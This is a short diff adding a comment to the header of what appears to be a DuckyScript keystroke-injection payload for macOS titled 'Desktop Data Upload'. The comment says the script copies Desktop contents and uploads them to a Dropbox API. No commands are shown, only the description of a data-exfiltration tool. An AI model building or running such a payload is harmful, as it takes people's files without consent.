@@ -1,3 +1,5 @@
+REM This script copies the contents of the Desktop and uploads it to a specific dropbox API
+
 REM Author: Narsty
 REM Title: Desktop Data Upload 
 REM Version 1.0 MacOs
